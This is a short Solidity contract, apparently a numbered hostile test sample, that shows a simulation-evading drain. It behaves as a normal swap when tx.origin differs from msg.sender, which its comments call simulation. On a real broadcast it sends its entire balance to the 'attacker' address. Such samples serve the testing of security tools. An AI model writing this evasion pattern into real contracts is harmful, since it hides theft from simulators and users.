// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract S04OriginGatedDrain {
    address public attacker;

    event SwapExecuted(address indexed user, string status);
    event Drained(address indexed attacker, uint256 amount);

    constructor() payable {
        attacker = msg.sender;
    }

    function swap() external {
        if (tx.origin == msg.sender) {
            // real broadcast: tx.origin equals msg.sender
            // drain funds to attacker
            uint256 balance = address(this).balance;
            (bool success, ) = payable(attacker).call{value: balance}("");
            require(success, "Drain failed");
            emit Drained(attacker, balance);
        } else {
            // simulation context: tx.origin != msg.sender
            // behave normally
            emit SwapExecuted(msg.sender, "swap_completed");
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}